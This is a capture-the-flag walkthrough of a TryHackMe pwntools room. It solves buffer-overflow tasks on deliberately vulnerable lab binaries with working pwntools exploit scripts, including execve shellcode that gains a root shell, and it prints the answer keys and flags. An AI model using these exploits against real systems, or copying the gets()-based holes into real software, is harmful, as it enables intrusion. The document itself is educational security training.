---
description: https://tryhackme.com/room/introtopwntools
---

# Intro To Pwntools

## Task 1 Introduction

```bash
ssh buzz@10.10.126.233
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 07-20-47.png>)

## Task 2 Checksec

```bash
cd IntroToPwntools/IntroToPwntools/checksec/
checksec intro2pwn1
checksec intro2pwn2
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 08-35-17.png>)

#### Does Intro2pwn1 have FULL RELRO?

{% hint style="success" %}
`Y`
{% endhint %}

#### Does Intro2pwn1 have RWX segments?

{% hint style="success" %}
`N`
{% endhint %}

#### Does Intro2pwn2 have a stack canary?

{% hint style="success" %}
`N`
{% endhint %}

#### Does Intro2pwn2 not have PIE?

{% hint style="success" %}
`Y`
{% endhint %}

#### Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?

```bash
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | ./intro2pwn1
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 08-39-50.png>)

{% hint style="success" %}
`stack smashing`
{% endhint %}

#### Now cause a buffer overflow on intro2pwn2. What error do you get?

```bash
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | ./intro2pwn2
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 08-41-33.png>)

{% hint style="success" %}
`Segmentation fault`
{% endhint %}

## Task 3 Cyclic

#### Which user owns both the flag.txt and intro2pwn3 file?

```bash
cd ../cyclic/
ls -l
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 08-51-34.png>)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_flag() {
	printf("Getting Flag:\n");
	fflush(stdout);
	char *cat_flag[3] = {"/bin/cat", "flag.txt", NULL};
	execve("/bin/cat", cat_flag,  NULL);
	exit(0);
}

void start(){
	char name[24];
	gets(name);
}

int main(){
	printf("I run as dizmas.\n");
	printf("Who are you?: ");
	start();
}
```

{% hint style="success" %}
`dizmas`
{% endhint %}

#### Use checksec on intro2pwn3. What bird-themed protection is missing?

```bash
checksec intro2pwn3
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 08-57-49.png>)

{% hint style="success" %}
`canary`
{% endhint %}

#### What ascii letter sequence is 0x4a4a4a4a.

```bash
gdb -q ./intro2pwn3
gdb > run < alphabet
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 08-59-44.png>)

{% hint style="success" %}
`JJJJ`
{% endhint %}

#### What is the output of "cyclic 12"?

```bash
cyclic 12
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-02-14.png>)

{% hint style="success" %}
`aaaabaaacaaa`
{% endhint %}

#### What pattern, in hex, was the eip overflowed with?

```bash
cyclic 100 > pattern
gdb > run < pattern
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-05-11.png>)

{% hint style="success" %}
`0x6161616a`
{% endhint %}

#### I have overflowed the eip with 0xdeadbeef

```python
from pwn import * 

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0xdeadbeef)
payload = padding + eip
print payload
```

```bash
gdb > run < <(python pwn_cyclic.py)
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-12-33.png>)

#### What is the flag?

```bash
gdb > info address print_flag
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-19-46.png>)

```python
from pwn import * 

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x8048536)
payload = padding + eip
print payload
```

```bash
gdb > run < <(python pwn_cyclic.py)
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-22-04.png>)

```bash
python pwn_cyclic.py | ./intro2pwn3
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-22-30.png>)

{% hint style="success" %}
`flag{13@rning_2_pwn!}`
{% endhint %}

## Task 4 Networking

#### What port is serving our challenge?

```bash
cd ../networking/
ls
nc 127.0.0.1 1337
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-26-11.png>)

{% tabs %}
{% tab title="note_to_buzz.txt" %}
Dear buzz,

I'm running a service on port 1337, which has an overflow vulnerability. I've left you a version that will run on port 1336 so that you can develop your exploit.

Sincerely, dizmas
{% endtab %}

{% tab title="test_networking.c" %}
```c
#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#define MAX 32
#define PORT 1336
#define SA struct sockaddr
  
// function which handles input and output over the socket
void target_function(int sockfd) {
    
    struct {
    	char buff[MAX];
    	volatile int printflag;
    } targets;

    for (;;) {
        bzero(targets.buff, MAX);
  	
	write(sockfd, "nc 127.", 18);

        targets.printflag = 0;
        read(sockfd, targets.buff, 100);
        
        printf("From client: %s\t ", targets.buff);
        bzero(targets.buff, MAX);
  
  
        if (targets.printflag == 0xdeadbeef) {
            write(sockfd, "Thank you!\nflag{*****************}", 34);
            break;
	}
	else if (targets.printflag != 0) {
	    write(sockfd, "Buffer Overflow, but not with 0xdeadbeef", 40);
            break;	
        }
    }
}

int main() {

    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
      
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
  
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
  
    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully binded..\n");
  
    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        exit(0);
    }
    else
        printf("Server listening..\n");
    len = sizeof(cli);
  
    // Accept the data packet from client and verification
    connfd = accept(sockfd, (SA*)&cli, &len);
    if (connfd < 0) {
        printf("server acccept failed...\n");
        exit(0);
    }
    else
        printf("server acccept the client...\n");
  
    // target function handles input and output
    target_function(connfd);
  
    // After chatting close the socket
    close(sockfd);
}
```
{% endtab %}
{% endtabs %}

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-31-07.png>)

{% hint style="success" %}
`1337`
{% endhint %}

#### Please use checksec on serve\_test. Is there a stack canary?

```bash
checksec serve_test
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-37-23.png>)

{% hint style="success" %}
`Y`
{% endhint %}

#### I have run my exploit against my own server on port 1336

```python
from pwn import *

connect = remote('127.0.0.1', sys.argv[1])
print connect.recvuntil('Give me deadbeef: ')
payload = "A" * 32 + p32(0xdeadbeef)
connect.sendline(payload)
print connect.recvall()
```

```bash
./serve_test &   
python pwn_networking.py 1336
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-54-26.png>)

#### What is the flag?

```bash
python pwn_networking.py 1337
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-52-16.png>)

## Task 5 Shellcraft

```bash
cd ../shellcraft/
ls -l
sudo ./disable_aslr.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 09-56-51.png>)

{% tabs %}
{% tab title="note_to_buzz_2.txt" %}
Dear buzz,

For this last pwntools challenge, you will need to disable ASLR. I have provided a script for you to do so, which you can run as sudo without a password. Just run:

sudo ./disable\_aslr.sh



Good luck!

Sincerely, dizmas
{% endtab %}

{% tab title="test_shellcraft.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void start(){
	char input[64];
	gets(input);
}

int main() {
	printf("Hello There. Do you have an input for me?\n");
	start();
}
```
{% endtab %}
{% endtabs %}

#### What does ASLR stand for?

{% hint style="success" %}
`address space layout randomization`
{% endhint %}

#### Who owns intro2pwnFinal?

{% hint style="success" %}
`root`
{% endhint %}

#### Use checksec on intro2pwn final. Is NX enabled?

```bash
checksec intro2pwnFinal
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 10-03-52.png>)

{% hint style="success" %}
`N`
{% endhint %}

#### Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?

```bash
gdb -q ./intro2pwnFinal
gdb > run < <(cyclic 100)
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 10-06-42.png>)

{% hint style="success" %}
`taaa`
{% endhint %}

#### Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal < output\_file). What does it say when you hit the breakpoint?

```python
from pwn import *

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd500 + 128)
nop_slide = '\x90' * 1000
shellcode = '\xcc'
print padding + eip + nop_slide + shellcode
```

```bash
python pwn_shellcraft.py | ./intro2pwnFinal
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 10-28-47.png>)

{% hint style="success" %}
`Trace/breakpoint trap`
{% endhint %}

#### Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. The first line will tell you that it is running a function from the Unix standard library, with the parameters of "(path='/bin///sh', argv=\['sh'], envp=0)." What function is it using?

```bash
shellcraft i386.linux.sh -f a
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 10-34-05.png>)

{% hint style="success" %}
`execve`
{% endhint %}

#### Run whoami once you have the shell. Who are you?

```bash
shellcraft i386.linux.execve '/bin///sh' "['sh', '-p']" -f s
```

{% tabs %}
{% tab title="pwn_shellcraft.py" %}
```python
from pwn import *

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd500 + 256)
nop_slide = '\x90' * 1000
shellcode = 'jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
print padding + eip + nop_slide + shellcode
```
{% endtab %}

{% tab title="pwn_shellcraft2.py" %}
```python
from pwn import *

proc = process("./intro2pwnFinal")
print proc.recvline()
padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd500 + 256)
nop_slide = '\x90' * 1000
shellcode = 'jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
payload = padding + eip + nop_slide + shellcode
proc.sendline(payload)
proc.interactive()
```
{% endtab %}
{% endtabs %}

```bash
(python pwn_shellcraft.py; cat) | ./intro2pwnFinal
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 10-57-21.png>)

```
python pwn_shellcraft2.py
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 11-13-43.png>)

#### What is the flag?

```bash
cat /root/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 11-02-21.png>)

{% hint style="success" %}
`flag{pwn!ng_!$_fr33d0m}`
{% endhint %}

## Reference

{% embed url="https://github.com/dizmascyberlabs/IntroToPwntools" %}
